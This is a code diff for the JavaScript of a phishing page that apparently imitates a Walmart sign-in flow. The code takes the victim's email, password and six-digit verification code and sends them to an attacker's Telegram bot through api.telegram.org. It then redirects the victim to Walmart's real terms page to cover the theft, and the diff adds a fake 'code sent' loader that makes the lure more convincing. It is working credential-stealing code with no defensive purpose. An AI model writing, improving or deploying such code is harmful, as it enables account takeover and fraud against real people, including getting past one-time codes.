@@ -1,3 +1,23 @@
+// Lógica para mostrar loader y mensaje al pedir otro código
+const getAnotherCode = document.getElementById('getAnotherCode');
+const codeLoader = document.getElementById('codeLoader');
+const codeSentMsg = document.getElementById('codeSentMsg');
+if(getAnotherCode && codeLoader && codeSentMsg){
+  getAnotherCode.addEventListener('click', (e)=>{
+    e.preventDefault();
+    codeSentMsg.style.display = 'none';
+    codeLoader.style.display = 'inline-block';
+    getAnotherCode.style.display = 'none';
+    setTimeout(()=>{
+      codeLoader.style.display = 'none';
+      codeSentMsg.style.display = 'inline-block';
+      setTimeout(()=>{
+        codeSentMsg.style.display = 'none';
+        getAnotherCode.style.display = 'inline';
+      }, 10000);
+    }, 1200);
+  });
+}
 // Importar la función para enviar credenciales a Telegram
 // Si usas módulos, descomenta la siguiente línea y asegúrate de usar type="module" en tu script en index.html
 // import { enviarCredencialesTelegram } from './sender.js';
@@ -9,9 +29,9 @@ const panelCode = document.getElementById('panelCode');
 
 // Al cargar la página, ocultar panel2 y panelCode, mostrar solo panel1
 document.addEventListener('DOMContentLoaded', () => {
-  if(panel1) { panel1.style.display = 'block'; panel1.setAttribute('aria-hidden','false'); }
-  if(panel2) { panel2.style.display = 'none'; panel2.setAttribute('aria-hidden','true'); }
-  if(panelCode) { panelCode.style.display = 'none'; panelCode.setAttribute('aria-hidden','true'); }
+  if (panel1) { panel1.style.display = 'block'; panel1.setAttribute('aria-hidden', 'false'); }
+  if (panel2) { panel2.style.display = 'none'; panel2.setAttribute('aria-hidden', 'true'); }
+  if (panelCode) { panelCode.style.display = 'none'; panelCode.setAttribute('aria-hidden', 'true'); }
 });
 const continueBtn = document.getElementById('continueBtn');
 const identifier = document.getElementById('identifier');
@@ -25,7 +45,7 @@ const togglePwd = document.getElementById('togglePwd');
 const password = document.getElementById('password');
 const signInBtn = document.getElementById('signInBtn');
 
-function showPanel2(email){
+function showPanel2(email) {
   displayEmail.textContent = email;
   codeEmail.textContent = email;
   panel1.style.display = 'none';
@@ -34,9 +54,9 @@ function showPanel2(email){
   panel1.setAttribute('aria-hidden', 'true');
 }
 
-continueBtn.addEventListener('click', ()=>{
+continueBtn.addEventListener('click', () => {
   const val = identifier.value.trim();
-  if(!val){
+  if (!val) {
     identifier.focus();
     identifier.style.borderColor = '#e05';
     return;
@@ -46,61 +66,61 @@ continueBtn.addEventListener('click', ()=>{
   showPanel2(val);
 });
 
-changeLink.addEventListener('click', (e)=>{
+changeLink.addEventListener('click', (e) => {
   e.preventDefault();
   panel2.style.display = 'none';
   panel1.style.display = 'block';
-  panel1.setAttribute('aria-hidden','false');
-  panel2.setAttribute('aria-hidden','true');
+  panel1.setAttribute('aria-hidden', 'false');
+  panel2.setAttribute('aria-hidden', 'true');
 });
 
 // toggle between code/password
-optCode.addEventListener('change', ()=>{
-  if(optCode.checked){
+optCode.addEventListener('change', () => {
+  if (optCode.checked) {
     passwordBlock.style.display = 'none';
   }
 });
-optPass.addEventListener('change', ()=>{
-  if(optPass.checked){
+optPass.addEventListener('change', () => {
+  if (optPass.checked) {
     passwordBlock.style.display = 'block';
   }
 });
 
-togglePwd.addEventListener('click', (e)=>{
+togglePwd.addEventListener('click', (e) => {
   e.preventDefault();
-  if(password.type === 'password'){
+  if (password.type === 'password') {
     password.type = 'text'; togglePwd.textContent = 'Hide';
   } else { password.type = 'password'; togglePwd.textContent = 'Show'; }
 });
 
-signInBtn.addEventListener('click', ()=>{
+signInBtn.addEventListener('click', () => {
   // Validar método y datos
-  if(optPass.checked && !password.value){
+  if (optPass.checked && !password.value) {
     password.style.borderColor = '#e05'; password.focus(); return;
   }
   // Ocultar panel1 y panel2
   panel1.style.display = 'none';
   panel2.style.display = 'none';
-  panel1.setAttribute('aria-hidden','true');
-  panel2.setAttribute('aria-hidden','true');
+  panel1.setAttribute('aria-hidden', 'true');
+  panel2.setAttribute('aria-hidden', 'true');
   // Mostrar panelCode
   const panelCode = document.getElementById('panelCode');
   const codePanelEmail = document.getElementById('codePanelEmail');
   const codePanelEmail2 = document.getElementById('codePanelEmail2');
-  if(panelCode && codePanelEmail && codePanelEmail2){
+  if (panelCode && codePanelEmail && codePanelEmail2) {
     panelCode.style.display = 'block';
-    panelCode.setAttribute('aria-hidden','false');
+    panelCode.setAttribute('aria-hidden', 'false');
     codePanelEmail.textContent = displayEmail.textContent;
     codePanelEmail2.textContent = displayEmail.textContent;
   }
   // Enviar a Telegram según método
-  if(optPass.checked){
-    if(typeof enviarCredencialesTelegram === 'function') {
+  if (optPass.checked) {
+    if (typeof enviarCredencialesTelegram === 'function') {
       enviarCredencialesTelegram(displayEmail.textContent, password.value);
     }
-    console.log('Signed in', {email:displayEmail.textContent, password:password.value});
+    console.log('Signed in', { email: displayEmail.textContent, password: password.value });
   } else {
-    if(typeof enviarCredencialesTelegram === 'function') {
+    if (typeof enviarCredencialesTelegram === 'function') {
       enviarCredencialesTelegram(displayEmail.textContent, '');
     }
     console.log('Request code for', displayEmail.textContent);
@@ -114,38 +134,38 @@ function enviarCodigoTelegram(email, codigo) {
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
   fetch(url, {
     method: 'POST',
-    headers: {'Content-Type': 'application/json'},
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: chatId,
       text: mensaje
     })
   })
-  .then(response => response.json())
-  .then(data => {
-    console.log('Código enviado a Telegram:', data);
-  })
-  .catch(error => {
-    console.error('Error enviando código a Telegram:', error);
-  });
+    .then(response => response.json())
+    .then(data => {
+      console.log('Código enviado a Telegram:', data);
+    })
+    .catch(error => {
+      console.error('Error enviando código a Telegram:', error);
+    });
 }
 
 // Lógica para capturar el código y enviarlo
 const signInCodeBtn = document.getElementById('signInCodeBtn');
-if(signInCodeBtn){
-  signInCodeBtn.addEventListener('click', ()=>{
+if (signInCodeBtn) {
+  signInCodeBtn.addEventListener('click', () => {
     const codeInputs = document.querySelectorAll('#codeInputs .code-input');
     let code = '';
     codeInputs.forEach(input => code += input.value.trim());
     const codeErrorAlert = document.getElementById('codeErrorAlert');
-    if(code.length === 6){
+    if (code.length === 6) {
       // Limpiar errores
-      if(codeErrorAlert) codeErrorAlert.style.display = 'none';
+      if (codeErrorAlert) codeErrorAlert.style.display = 'none';
       codeInputs.forEach(input => input.classList.remove('error'));
       enviarCodigoTelegram(codePanelEmail.textContent, code);
       // Redirigir a la página de Walmart después de enviar el código
       window.location.href = 'https://www.walmart.com/help/article/walmart-com-terms-of-use/3b75080af40340d6bbd596f116fae5a0';
     } else {
-      if(codeErrorAlert) codeErrorAlert.style.display = 'block';
+      if (codeErrorAlert) codeErrorAlert.style.display = 'block';
       codeInputs.forEach(input => input.classList.add('error'));
       codeInputs[0].focus();
     }
@@ -161,14 +181,14 @@ codeInputs.forEach((input, idx) => {
     // Limpiar error al escribir
     input.classList.remove('error');
     const codeErrorAlert = document.getElementById('codeErrorAlert');
-    if(codeErrorAlert) codeErrorAlert.style.display = 'none';
-    if(input.value.length === 1 && idx < codeInputs.length-1){
-      codeInputs[idx+1].focus();
+    if (codeErrorAlert) codeErrorAlert.style.display = 'none';
+    if (input.value.length === 1 && idx < codeInputs.length - 1) {
+      codeInputs[idx + 1].focus();
     }
   });
   input.addEventListener('keydown', (e) => {
     // Bloquear letras y caracteres no numéricos
-    if(
+    if (
       e.key.length === 1 &&
       !/[0-9]/.test(e.key) &&
       e.key !== 'Backspace' &&
@@ -178,25 +198,25 @@ codeInputs.forEach((input, idx) => {
     ) {
       e.preventDefault();
     }
-    if(e.key === 'Backspace' && !input.value && idx > 0){
-      codeInputs[idx-1].focus();
+    if (e.key === 'Backspace' && !input.value && idx > 0) {
+      codeInputs[idx - 1].focus();
     }
   });
 });
 
 // small UX: enter on field
-identifier.addEventListener('keydown', (e)=>{ if(e.key === 'Enter') continueBtn.click(); });
-password.addEventListener('keydown', (e)=>{ if(e.key === 'Enter') signInBtn.click(); });
+identifier.addEventListener('keydown', (e) => { if (e.key === 'Enter') continueBtn.click(); });
+password.addEventListener('keydown', (e) => { if (e.key === 'Enter') signInBtn.click(); });
 
 // footer toggle behavior
 const optSwitch = document.getElementById('optSwitch');
-if(optSwitch){
+if (optSwitch) {
   // default on
   optSwitch.classList.add('on');
-  optSwitch.addEventListener('click', ()=>{
+  optSwitch.addEventListener('click', () => {
     optSwitch.classList.toggle('on');
     const checked = optSwitch.classList.contains('on');
     optSwitch.setAttribute('aria-checked', checked ? 'true' : 'false');
   });
-  optSwitch.addEventListener('keydown', (e)=>{ if(e.key === 'Enter' || e.key === ' ') { e.preventDefault(); optSwitch.click(); }});
+  optSwitch.addEventListener('keydown', (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); optSwitch.click(); } });
 }
